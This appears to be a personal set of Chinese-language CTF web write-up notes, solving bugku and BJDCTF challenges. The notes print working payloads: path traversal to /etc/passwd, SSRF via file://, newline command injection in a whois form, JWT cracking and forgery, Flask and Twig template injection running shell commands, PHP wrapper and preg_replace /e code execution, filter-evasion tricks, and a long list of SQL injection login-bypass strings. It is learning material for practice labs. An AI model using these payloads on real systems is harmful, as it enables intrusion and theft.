# 1.http类型
## 1.1 F12查看页面源代码得到flag
## 1.2 post,get传递参数
- bugku post-the-get
打开靶场，有两个输入框，Full name和Address，还有post字样
- 方法1：
查看页面源代码，参数传递方式是get，提交按钮是disabled状态
![alt text](image.png)
F12查看器修改源代码，删除disabled，但光这样还不够，删除后提示good try but you don't post
将提交方法改为post，随后随便输入值，点击post拿到flag
shellmates{7HE_w3B_is_w31RD}
- 方法2：
使用hackbar 提交post参数
![alt text](image-1.png)

## 1.3 目录访问
- bugku baby lfi 2
进入靶场，提示有一个language目录，还有/etc/passwd目录
![alt text](image-5.png)
目标是进入/etc/passwd目录，构造payload:
```
?language=./languages/../../../../../../etc/passwds
```
language是参数，这里需要多试几个，比如file
./languages 表示当前目录的相对路径，之后只要/..打的够多就能回到根目录
末尾发现flag：shellmates{yOU_M4De_yOUr_waY_7hRough_iT} 
- 还可以使用burpsuite构造http报文
![alt text](image-6.png)

## 1.4 curl命令
- 命令参考https://blog.csdn.net/u013514928/article/details/102810250
- bugku HEADache
进入环境，提示Otherwise, if you want the flag just ask for it politely :D
礼貌地请求flag
- kali使用命令curl http://82.157.146.43:16341/ -H "Wanna-Something:can-i-have-a-flag-please"
-H 表示添加请求头，格式：
```
-H "NAME: VALUE"
```
拿到flag：shellmates{hTTp_H34d37R5_&_p0L173N355_c4n_B3_U53FULL}

## 1.5 构造请求
- bugku nextGen 1
题目提示flag在flag.txt中，直接访问http://82.157.146.43:17603/flag.txt，返回Page not found，说明不在这里
查看源代码最低下面的js代码
```js
function myFunc(eventObj) {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function () {
      if (this.readyState == 4 && this.status == 200) {
        document.getElementById("content").innerHTML = xhttp.responseText;
      }
    };
    xhttp.open("POST", '/request');
    xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhttp.send("service=" + this.attributes.link.value);
 
  }
 
  var dep = document.getElementsByClassName('department');
  for (var i = 0; i < dep.length; i++) {
    dep[i].addEventListener('click', myFunc);
  }
```
关键"POST", '/request'，"service=" + this.attributes.link.value
构造payload：
```
POST /request
service=file:///flag.txt
```
![alt text](image-7.png)
拿到flag：shellmates{1T_W4S_4_qu1T3_3s4y_expl01tabL3_$$Rf}

- bugku nextGen 1
和上一题类似，但增加了一些过滤。必须要是 xxx://xxxxx/xxxxx 这种格式
尝试了一下
service=file://localhost/flag.txt
service=file://127.0.0.1/flag.txt
返回page not found，都被过滤了
常用替代
127.0.0.1 =
127.1 =
127.0.1
构造payload
```
service=file://127.1/flag.txt
service=file://127.0.1/flag.txt
```
拿到flag：shellmates{Y0u_d1D_1t_aG4iN_!!}

## 1.6 远程代码执行漏洞（RCE）
- bugku Whois
进入环境，按照示例输入php.net查询，得到一些文字，没有发现flag
观察浏览器地址栏，通过query.php接受host和query参数
```
http://82.157.146.43:11975/query.php?host=whois.verisign-grs.com&query=php.net
```
查看一下query.php
```
http://82.157.146.43:11975/query.php
```
```php
<?php

error_reporting(0);

$output = null;
$host_regex = "/^[0-9a-zA-Z][0-9a-zA-Z\.-]+$/";
$query_regex = "/^[0-9a-zA-Z\. ]+$/";

if (isset($_GET['query']) && isset($_GET['host']) && 
      is_string($_GET['query']) && is_string($_GET['host'])) {

  $query = $_GET['query'];
  $host = $_GET['host'];
  
  if ( !preg_match($host_regex, $host) || !preg_match($query_regex, $query) ) {
    $output = "Invalid query or whois host";
  } else {
    $output = shell_exec("/usr/bin/whois -h ${host} ${query}");
  }

} 
else {
  highlight_file(__FILE__);
  exit;
}

?>

<!DOCTYPE html>
<html>
  <head>
    <title>Whois</title>
  </head>
  <body>
    <pre><?= htmlspecialchars($output) ?></pre>
  </body>
</html>
```
接受host和query参数，然后在远程执行shell_exec函数，最后通过htmlspecialchars函数输出
- 接下来就是构造参数了
host参数只能由0-9、a-z、A-Z、.（点）、-（减号）以及\n或者\r 组成
query参数只能由0-9、a-z、A-Z、.（点）、 （空格）以及\n或者\r组成
这里命令拼接就只能使用换行符\n，在url中是%0a
payload
```
http://82.157.146.43:11975/query.php?host=whois.verisign-grs.com%0a&query=ls
```
返回当前目录下的所有文件：
index.html
query.php
thisistheflagwithrandomstuffthatyouwontguessJUSTCATME
直接查看thisistheflagwithrandomstuffthatyouwontguessJUSTCATME文件
http://82.157.146.43:11975/query.php?host=whois.verisign-grs.com%0a&query=cat thisistheflagwithrandomstuffthatyouwontguessJUSTCATME
拿到flag:shellmates{i_$h0U1D_HaVE_R3AD_7HE_dOc_W3Ll_9837432986534065}

## 1.7 put传递参数
- bugku charlottesweb
进入环境查看源代码
![alt text](image-8.png)
进入/src，开始下载app.py
```python
import flask

app = flask.Flask(__name__)

@app.route('/', methods=['GET'])
def index():
  return flask.send_file('index.html')

@app.route('/src', methods=['GET'])
def source():
  return flask.send_file('app.py')

@app.route('/super-secret-route-nobody-will-guess', methods=['PUT'])
def flag():
  return open('flag').read()
```
要拿到flag需要发送PUT请求，传递的参数是/super-secret-route-nobody-will-guess
可以使用burpsuite发送PUT请求![alt text](image-9.png)
也可以使用apipost发送![alt text](image-10.png)
wctf{y0u_h4v3_b33n_my_fr13nd___th4t_1n_1t53lf_1s_4_tr3m3nd0u5_th1ng}

## 1.8 JWT爆破
- bugku just-work-type
进入环境，提示使用zombo登录，登录后提示不是admin
抓包，得到token：eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOnsiYWRtaW4iOmZhbHNlLCJkYXRhIjp7InVzZXJuYW1lIjoiem9tYm8iLCJwYXNzd29yZCI6InpvbWJvIn19LCJpYXQiOjE3MTMyNTg2NTYsImV4cCI6MTcxMzI2MjI1Nn0.hDUeoGGbIUGuStfgJh5GpbPaEnlkpUIoEsaw1tTL13s
![alt text](image-11.png)
JWT爆破，可以使用工具，也可以使用python脚本，脚本已经保存，这里演示一下工具的使用：
进入工作目录，使用命令：
```
./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOnsiYWRtaW4iOmZhbHNlLCJkYXRhIjp7InVzZXJuYW1lIjoiem9tYm8iLCJwYXNzd29yZCI6InpvbWJvIn19LCJpYXQiOjE3MTMyNTg2NTYsImV4cCI6MTcxMzI2MjI1Nn0.hDUeoGGbIUGuStfgJh5GpbPaEnlkpUIoEsaw1tTL13s
```
得到secret
![alt text](image-12.png)
进入JWT.io网站 https://jwt.io/
伪造新token，将admin修改为true，同时填入secret为123，得到新token![alt text](image-13.png)![alt text](image-14.png)
新token
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOnsiYWRtaW4iOnRydWUsImRhdGEiOnsidXNlcm5hbWUiOiJ6b21ibyIsInBhc3N3b3JkIjoiem9tYm8ifX0sImlhdCI6MTcxMzI1ODY1NiwiZXhwIjoxNzEzMjYyMjU2fQ.ZLVfnbBoLmS2ikhSemUvRrq5E3hVccH_pdKqy5vpdVA
```
构造payload：
Cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOnsiYWRtaW4iOnRydWUsImRhdGEiOnsidXNlcm5hbWUiOiJ6b21ibyIsInBhc3N3b3JkIjoiem9tYm8ifX0sImlhdCI6MTcxMzI1ODY1NiwiZXhwIjoxNzEzMjYyMjU2fQ.ZLVfnbBoLmS2ikhSemUvRrq5E3hVccH_pdKqy5vpdVA
在返回的代码中发现flag：shellmates{w34k_JwT_$3CR3T}
![alt text](image-15.png)
注意这里的token有所不同，因为重新开环境了
需要访问/home 才能返回flag

## 1.9 SSTI(服务器模板注入)
- Simple_SSTI_1
参考：https://www.adminxe.com/2022.html
进入环境，提示：You need pass in a parameter named flag。 需要传递一个名为flag的参数，那么参数值呢？
查看页面源代码：
<!-- You know, in the flask, We often set a secret_key variable.-->
构造payload：?flag={{ config.SECRET_KEY}}拿到flag

- Simple_SSTI_2
参考：https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#0X00-%E5%89%8D%E8%A8%80%EF%BC%9A
https://winny.work/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%90%9E%E6%87%82%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/358.html
和上题一样SSTI，不过没有提示引擎，先查看报错得到引擎，payload：?flag={{1}
![alt text](image-17.png)
引擎是python的flask模板
构造payload：?flag={{ config.__class__.__init__.__globals__['os'].popen('ls ../').read() }}
![alt text](image-18.png)
payload:?flag={{ config.__class__.__init__.__globals__['os'].popen('ls ').read() }}
![alt text](image-19.png)
查看flag:?flag={{ config.__class__.__init__.__globals__['os'].popen('cat ../app/flag').read() }}

## 1.10 修改源代码
- bugku 计算器
进入环境，结果应该是98，两位数，但输入框只能接受一位数
![alt text](image-22.png)
F12查看器，修改最大长度为2
![alt text](image-23.png)
输入98获得flag

## 1.11 xxf伪造ip
burpsuite抓包添加：
```
X-Forwarded-For: 127.0.0.1
```
php可能存在Twig模板注入，此时xxf会被当做代码执行，如：
```
X-Forwarded-For: {{system('ls')}}
X-Forwarded-For: {{system('ls /')}}
X-Forwarded-For: {{system('cat /flag')}}
```
## 1.12 修改Referer
- bugku 你从哪里来
进入环境，页面提示：are you from google?
说明需要从google跳转来，burpsuite抓包，放行得到flag
![alt text](image-24.png)
- 修改Referer可以和xxf，User-Agent结合
$\color{FF0000}{注意，不要放在消息头的末尾，插在消息头中间}$
```
X-Forwarded-For: 127.0.0.1
Referer:http://127.0.0.1
User-Agent: Syclover
```

## file_get_contents绕过，preg_match绕过
- [BJDCTF2020]ZJCTF，不过如此
```php
 <?php
error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```
text参数要包含"I have a dream"，绕过方法有：
- 1.使用php://input伪协议绕过
将要GET的参数?xxx=php://input
用post方法传入想要file_get_contents()函数返回的值
- 2.data://伪协议绕过
将url改为：?xxx=data://text/plain;base64,想要file_get_contents()函数返回的值的base64编码
或者将url改为：?xxx=data:text/plain,(url编码的内容)

用data://绕过，file不能含有flag，使用php://filter 绕过，用base64输出就不会匹配到了payload:
```
?text=data://text/plain,I have a dream&file=php://filter/read/convert.base64-encode/resource=next.php
```
得到base64字符串，解码：
```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}

```
这里的PHP版本是：5.6.40，preg_replace()+/e存在代码执行漏洞
PHP正则表达式的逆向引用与子模式分析：https://blog.csdn.net/qq_20408491/article/details/75095055
```
/?text=data://text/pain,I have a dream&file=next.php&\S*=${phpinfo()}
```
![alt text](image-49.png)
```
/?text=data://text/pain,I have a dream&file=next.php&\S*=${getFlag()}&cmd=system('cat /flag');
注意末尾的';'号
```
![alt text](image-50.png)

## cat绕过，空格绕过
cat使用tac
空格使用$IFS$9

# 2.sql注入
## 2.1 万能账户密码
- 万能密码原理https://blog.csdn.net/hxhxhxhxx/article/details/108020010
- bugku my-first-sqli
- 本体参考https://blog.csdn.net/weixin_40114827/article/details/135323792
进入靶场，提示输入账户密码登录，sql语句是SELECT * FROM USERS WHERE username = ? AND password = ?
![alt text](image-2.png)
试试万能账户密码：
```
admin' or 1=1--
1
```
--是注释符，--后面的语句不执行，所以没有执行AND password = ?
![alt text](image-4.png)
密码输什么都可以，拿到flag：shellmates{SQLi_goeS_BrrRrRR} 
- 万能密码：
```
' or 1='1
'or'='or'
admin
admin'--
admin' or 4=4--
admin' or '1'='1'--
admin888
"or "a"="a
admin' or 2=2#
a' having 1=1#
a' having 1=1--
admin' or '2'='2
')or('a'='a
or 4=4--
c
a'or' 4=4--
"or 4=4--
'or'a'='a
"or"="a'='a
'or''='
'or'='or'
1 or '1'='1'=1
1 or '1'='1' or 4=4
'OR 4=4%00
"or 4=4%00
'xor
admin' UNION Select 1,1,1 FROM admin Where ''='
1
-1%cf' union select 1,1,1 as password,1,1,1 %23
1
17..admin' or 'a'='a 密码随便
'or'='or'
'or 4=4/*
something
' OR '1'='1
1'or'1'='1
admin' OR 4=4/*
1'or'1'='1

```

## 2.2联合注入覆盖
- bugku sqli-0x1
- 参考http://47.98.239.98/2023/11/15/ctf-websqli-0x1-bugku/
进入靶场，查看源代码，<!-- <a href="/?pls_help">get some help</a> -->
提示了一个payload，进去看看
Username:1'union/**/select/**/1,'4fc82b26aecb47d2868c4efbe3581732a3e7cbcc6c2efb32062c08170a05eeb8$1
password:1
得到flag：Welcome back admin! Have a flag: shellmates{c0ngr4tul4t10ns_U_d1d_1t!!_fe4cd84591ea}